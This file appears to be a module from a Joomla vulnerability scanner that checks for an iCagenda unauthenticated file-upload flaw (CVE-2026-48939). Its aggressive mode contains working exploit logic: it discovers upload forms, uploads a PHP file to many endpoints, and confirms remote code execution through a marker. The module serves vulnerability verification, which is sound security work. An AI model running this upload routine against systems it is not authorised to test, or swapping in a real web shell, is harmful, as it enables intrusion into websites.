from __future__ import annotations

import re
import urllib.parse

from ...core.http import build_multipart, normalize_url, poll_paths, request
from ...core.models import Finding

CVECheckResult = Finding
from ...core.probes import rand_str
from ...core.versions import version_in_specifier

CVE_ID = "CVE-2026-48939"
NAME = "iCagenda arbitrary file upload to RCE"
COMPONENT = "iCagenda"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["aggressive"]
AFFECTED_JOOMLA_VERSIONS = ["*"]
AFFECTED_RULE = "iCagenda 3.2.1 through 3.9.14 and 4.0.0 through 4.0.7"
FIXED_RULE = "iCagenda 3.9.15, 4.0.8, or later"
UPLOAD_ENDPOINTS = [
    "/index.php?option=com_icagenda&task=submit.save",
    "/component/icagenda/?task=submit.save",
    "/index.php?option=com_icagenda&task=event.save",
    "/component/icagenda/?task=event.save",
    "/index.php?option=com_icagenda&task=registration.save",
]
PUBLIC_ATTACHMENT_DIRS = [
    "/images/com_icagenda/attachments/",
    "/images/icagenda/attachments/",
    "/media/com_icagenda/attachments/",
    "/images/attachments/",
]
FORM_DISCOVERY_PATHS = [
    "/index.php?option=com_icagenda",
    "/component/icagenda/",
    "/index.php?option=com_icagenda&view=submit",
    "/index.php?option=com_icagenda&view=event",
    "/index.php?option=com_icagenda&view=registration",
    "/component/icagenda/submit/",
]
UPLOAD_PROFILES = [
    {
        "name": "jform_attachment",
        "fields": {
            "title": "ProofCMS Lab Test",
            "jform[title]": "ProofCMS Lab Test",
            "jform[name]": "ProofCMS",
            "jform[email]": "audit@example.invalid",
        },
        "file_field": "jform[attachment]",
    },
    {
        "name": "attachment",
        "fields": {
            "title": "ProofCMS Lab Test",
            "name": "ProofCMS",
            "email": "audit@example.invalid",
        },
        "file_field": "attachment",
    },
    {
        "name": "file",
        "fields": {
            "title": "ProofCMS Lab Test",
            "name": "ProofCMS",
            "email": "audit@example.invalid",
        },
        "file_field": "file",
    },
    {
        "name": "jform_attachment_array",
        "fields": {
            "title": "ProofCMS Lab Test",
            "jform[title]": "ProofCMS Lab Test",
            "jform[name]": "ProofCMS",
            "jform[email]": "audit@example.invalid",
        },
        "file_field": "jform[attachment][]",
    },
]


def affected_icagenda(version: str | None) -> bool:
    return bool(
        version_in_specifier(version, ">=3.2.1,<=3.9.14")
        or version_in_specifier(version, ">=4.0.0,<=4.0.7")
    )


def body_summary(response: dict, marker: str) -> str:
    body = response.get("body", "")
    lowered = body.lower()
    flags = []
    if marker in body:
        flags.append("marker=yes")
    if "<?php" in lowered:
        flags.append("raw_php=yes")
    if "<html" in lowered or "<!doctype" in lowered:
        flags.append("html=yes")
    if "404" in lowered or "not found" in lowered or "página não encontrada" in lowered:
        flags.append("not_found_text=yes")
    return f"{response.get('status')} len={len(body)}" + (f" ({', '.join(flags)})" if flags else "")


def summarize_observed(items: list[str], limit: int = 5) -> str:
    if len(items) <= limit:
        return "; ".join(items)
    shown = "; ".join(items[:limit])
    return f"{shown}; ... {len(items) - limit} more upload attempt(s) with no marker proof"


def candidate_proof_urls(base: str, filename: str, upload_body: str) -> list[str]:
    candidates = []
    quoted = urllib.parse.quote(filename)
    for directory in PUBLIC_ATTACHMENT_DIRS:
        candidates.append(f"{base}{directory}{quoted}")

    for match in re.findall(rf'["\']([^"\']*{re.escape(filename)}[^"\']*)["\']', upload_body):
        if match.startswith(("http://", "https://")):
            candidates.append(match)
        else:
            candidates.append(f"{base}/{match.lstrip('/')}")

    for match in re.findall(rf'((?:images|media)/[^<>"\']*{re.escape(filename)})', upload_body):
        candidates.append(f"{base}/{match.lstrip('/')}")

    unique = []
    seen = set()
    for item in candidates:
        if item not in seen:
            seen.add(item)
            unique.append(item)
    return unique


def absolute_url(base: str, value: str) -> str:
    if value.startswith(("http://", "https://")):
        return value
    if value.startswith("/"):
        return f"{base}{value}"
    return f"{base}/{value}"


def extract_attr(tag: str, attr: str) -> str | None:
    match = re.search(rf'\b{re.escape(attr)}\s*=\s*["\']([^"\']*)["\']', tag, re.IGNORECASE)
    return match.group(1) if match else None


def discover_upload_profiles(base: str, timeout: int, proxy: str | None) -> list[dict]:
    discovered = []
    seen = set()
    for path in FORM_DISCOVERY_PATHS:
        page_url = absolute_url(base, path)
        page = request(page_url, timeout=timeout, proxy=proxy)
        if page.get("status") != 200:
            continue
        html = page.get("body", "")
        for form_match in re.finditer(r"<form\b[^>]*>.*?</form>", html, re.IGNORECASE | re.DOTALL):
            form = form_match.group(0)
            file_fields = []
            for input_match in re.finditer(r"<input\b[^>]*>", form, re.IGNORECASE):
                tag = input_match.group(0)
                input_type = (extract_attr(tag, "type") or "").lower()
                input_name = extract_attr(tag, "name")
                if input_type == "file" and input_name:
                    file_fields.append(input_name)
            if not file_fields:
                continue

            fields = {}
            for input_match in re.finditer(r"<input\b[^>]*>", form, re.IGNORECASE):
                tag = input_match.group(0)
                input_type = (extract_attr(tag, "type") or "").lower()
                input_name = extract_attr(tag, "name")
                if input_type == "hidden" and input_name:
                    fields[input_name] = extract_attr(tag, "value") or ""

            action = extract_attr(form.split(">", 1)[0], "action") or page_url
            action_url = absolute_url(base, action)
            for file_field in file_fields:
                key = (action_url, file_field)
                if key in seen:
                    continue
                seen.add(key)
                discovered.append(
                    {
                        "name": f"discovered_form:{path}",
                        "upload_url": action_url,
                        "fields": fields,
                        "file_field": file_field,
                    }
                )
    return discovered


def run_aggressive_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    marker = f"JVH_ICAGENDA_CONFIRMED_{rand_str(10)}"
    filename = f"jvh-icagenda-{rand_str(8)}.php"
    payload = f"<?php echo '{marker}'; ?>"
    observed = []

    initial_dir_checks = []
    for directory in PUBLIC_ATTACHMENT_DIRS:
        probe = request(f"{base}{directory}", timeout=timeout, proxy=proxy)
        initial_dir_checks.append(f"{directory} {probe.get('status')}")
    observed.append(f"initial dirs: {', '.join(initial_dir_checks)}")

    attempts = discover_upload_profiles(base, timeout=timeout, proxy=proxy)
    if attempts:
        observed.append(f"discovered upload forms: {len(attempts)}")
    for endpoint in UPLOAD_ENDPOINTS:
        for profile in UPLOAD_PROFILES:
            profile_copy = dict(profile)
            profile_copy["upload_url"] = f"{base}{endpoint}"
            profile_copy["endpoint_label"] = endpoint
            attempts.append(profile_copy)

    for profile in attempts:
        endpoint_label = profile.get("endpoint_label") or profile.get("upload_url", "discovered-form")
        content_type, body = build_multipart(
            profile["fields"],
            {
                profile["file_field"]: (filename, payload, "application/x-php"),
            },
        )
        upload_url = profile["upload_url"]
        upload = request(
            upload_url,
            method="POST",
            headers={"Content-Type": content_type},
            data=body,
            timeout=timeout,
            proxy=proxy,
        )
        candidate_urls = list(candidate_proof_urls(base, filename, upload.get("body", "")))
        proof, found_url, attempts = poll_paths(
            lambda u: request(u, timeout=timeout, proxy=proxy),
            candidate_urls,
            deadline=3.0,
            initial_delay=0.1,
        )
        if proof and proof.get("status") == 200 and found_url:
            proof_body = proof.get("body", "")
            proof_lower = proof_body.lower()
            if marker in proof_body and "<?php" not in proof_lower:
                return Finding(
                    cve=CVE_ID,
                    name=NAME,
                    status="VULNERABLE",
                    confidence="CONFIRMED",
                    component=COMPONENT,
                    affected_rule=AFFECTED_RULE,
                    exploit_available=HAS_EXPLOIT,
                    exploit_ran=True,
                    proof_url=found_url,
                    uploaded_filename=filename,
                    detail=(
                        f"Aggressive lab upload executed benign PHP marker via {endpoint_label} "
                        f"using field {profile['file_field']} after {attempts} attempt(s). "
                        "The attachment directory may have been created by this first upload."
                    ),
                    action=(
                        f"Delete the uploaded proof file {filename} from the iCagenda attachment "
                        f"directory, inspect for compromise, and upgrade iCagenda to {FIXED_RULE}."
                    ),
                )
            if marker in proof_body and "<?php" in proof_lower:
                return Finding(
                    cve=CVE_ID,
                    name=NAME,
                    status="VULNERABLE_UPLOAD_ONLY",
                    confidence="HIGH",
                    component=COMPONENT,
                    affected_rule=AFFECTED_RULE,
                    exploit_available=HAS_EXPLOIT,
                    exploit_ran=True,
                    proof_url=found_url,
                    uploaded_filename=filename,
                    detail=(
                        f"File write confirmed via {endpoint_label} using field {profile['file_field']} "
                        f"(verified in {attempts} attempt(s)), but PHP execution was not confirmed because the server returned raw PHP source."
                    ),
                    action=f"Delete {filename} from the iCagenda attachment directory and upgrade iCagenda to {FIXED_RULE}.",
                )
        observed.append(
            f"{endpoint_label} [{profile['name']}:{profile['file_field']}]: "
            f"upload {body_summary(upload, marker)}; attempts: {attempts}"
        )
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="NOT_CONFIRMED",
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        exploit_ran=True,
        uploaded_filename=filename,
        detail=(
            "Aggressive lab upload did not confirm iCagenda execution or public file write. "
            "A plain HTTP 200 is not treated as proof unless the unique marker is present. "
            f"Observed: {summarize_observed(observed)}."
        ),
        action=f"If {filename} was written to an attachment directory, delete it. Upgrade iCagenda to {FIXED_RULE}.",
    )


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    plugins: dict | None = None,
    **kwargs,
) -> Finding:
    icagenda = (plugins or {}).get("icagenda", {})
    found = bool(icagenda.get("found"))
    version = icagenda.get("version")
    source = icagenda.get("source") or "unknown"

    if not found:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_DETECTED",
            confidence="MEDIUM",
            component=COMPONENT,
            component_version=None,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            detail="iCagenda was not detected via /index.php?option=com_icagenda or /component/icagenda/.",
            action="Component not detected via standard public routes; verify manually if installed at another route.",
        )

    if not version:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="INCONCLUSIVE",
            confidence="MEDIUM",
            component=COMPONENT,
            component_version=None,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            detail=f"iCagenda was detected at {source}, but its version could not be parsed from the HTML.",
            action=f"Manually verify iCagenda version. Fixed versions: {FIXED_RULE}.",
        )

    if affected_icagenda(version):
        detail = (
            f"iCagenda {version} was detected at {source} and is in the affected range. "
            "The reported impact is unauthenticated file upload with RCE risk when PHP uploads execute."
        )
        if run_exploit_check:
            if exploit_mode == "aggressive":
                probe = run_aggressive_probe(target_url, timeout=timeout, proxy=proxy)
                probe.component_version = version
                return probe
            detail += " This CVE has no safe exploit verification because validation requires file upload behavior."
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="LIKELY_VULNERABLE",
            confidence="HIGH",
            component=COMPONENT,
            component_version=version,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            detail=detail,
            action=f"Upgrade iCagenda to {FIXED_RULE}.",
        )

    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="PATCHED",
        confidence="HIGH",
        component=COMPONENT,
        component_version=version,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        detail=f"iCagenda {version} was detected at {source} and is outside the affected ranges.",
        action=f"Keep iCagenda at {FIXED_RULE}.",
    )


def affects_joomla_version(joomla_version: str | None) -> bool:
    return True


def metadata() -> dict:
    return {
        "cve": CVE_ID,
        "name": NAME,
        "component": COMPONENT,
        "affected_rule": AFFECTED_RULE,
        "affected_joomla_versions": AFFECTED_JOOMLA_VERSIONS,
        "exploit_available": HAS_EXPLOIT,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": INTRUSIVE,
        "module_version": "1.2.0",
        "last_reviewed": "2026-03-20",
        "updated": "2026-03-20",
        "required_detectors": ["icagenda"],
        "references": [
            "https://www.icagenda.com",
        ],
    }
